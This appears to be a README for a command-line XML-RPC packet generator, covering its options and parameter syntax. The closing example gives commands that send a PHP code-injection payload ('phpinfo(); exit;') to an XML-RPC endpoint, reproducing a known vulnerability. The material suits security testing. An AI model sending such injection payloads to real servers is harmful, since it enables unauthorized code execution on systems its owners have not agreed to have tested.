# Introduction #

The tool is designed to make, in command line, easily XML-RPC packet to a remote server. offering the possibility of being used in scripts for automation.

# Author #

The author of tool is **Daniel Garcia García a.k.a cr0hn**, Security auditor and contributor of www.iniqua.com

In twitter @ggdaniel

# More info #

For Spanish examples and explanations you can visit: http://www.iniqua.com/2010/09/01/tool-xml-rpc-packet-generator/

# Quick questions about XML-RPC #

A few quick questions:

  * Q: What is XML-RPC and is good for?
  * A: Is a way to communicate with remote systems and ask them to do something and send us the results. For example: You could ask the server 'X' that calculates the sum of two very large and we return the result.

  * Q: ¿Who uses it?
  * A: Wordpress or Drupal are two examples.

  * Q: To be used?
  * A: To provide some functionality such as: Consultation statistics, remote access by mobile phone, remote configuration ...

  * Q: What I can assert to me this tool?
  * A: Depends on the use of it. We could serve to perform certain exploits, extracting information from the service or, if you're a developer, test your Web service.

# Funcionality #

This tool allows you to communicate with an XML-RPC service and built packages as custom as you want.

Tool have several options:

### Required options ###
  * -t: Target. This parameters indicate URL where service is running: `http://www.vulnerablesite.com/xmlrpc.php`
  * -M: Method. Remote method or function that you want to call. In the example of the sum of numbers it can be: SumBigNumbers.
  * -P: Parameters. Explained below.

### Global Options ###
  * -h: show help dialog.
  * -v: Set verbose mode on. With this option activated, the program will show package before sending.
  * -u: User name for web server.
  * -p: Password.

### Parameters: How it works. ###

There are several types of parameters, according to specification. It can be found at http://en.wikipedia.org/wiki/XML-RPC.

According to type parameters are expressed in one form or another:

**All but, array and struct types:**

In this case syntax are: type1@value1!type2@value2!...!typeN@valueN. Type and value are a indivisible tuple, united by '@'. Separator between tuples are '!' symbol. For example:

```
-P integer @12!String@string
```

**Array type:**

Array type may have several values inside. These values are in pairs or tuples. Each pair is separated by '#' symbol. Each tuple are splitted by '%' symbol. Example:

```
-P array@type1#value1%type1#value2%...%typeN#valueN
```

**Struct type:**

Similar to array, but with 3 params for tuple. Each tuple must be member name, value and type of value. Syntax is equal to array but the tuple has a length of 3. Example:
```
-P struct@name1#type1#value1%...%nameN#typeN#valueN
```

**Custom type:**

If our type is no above, we can make our own type. Syntax is: custom@OurVal1#OurVal2%...%OurValN#OurValN. Example:

```
-P custom@BigInt#99999999999%NegativeInt#-10000
```

This command will produce following code:

```
<BigInt>
   99999999999
</BigInt>
<NegativeInt>
   -10000
</NegativeInt>
```

# Real example #

If we look a bit on the internet we can find a vulnerability associated with XML-RPC: http://www.securityfocus.com/bid/14088/exploit.

If we want reproduce these code we can write the following command:

**Windows:**

```
RPCClient.exe -t http://www.sitiovulnerable.com/xmlrpc.php -v -M test.method -P "custom@value#’,”)); phpinfo(); exit;/*”
```

**Linux/MAC/UNIX compatible:**

```
Mono RPCClient.exe -t http://www.sitiovulnerable.com/xmlrpc.php -v -M test.method -P ”custom@value#’,”)); phpinfo(); exit;/*”
```

It is very important to stress the importance of the quotes that are at the beginning and end of the parameters, because without them shell interpret the command line of what is hidden and not happen in full as a parameter to rpc-client.
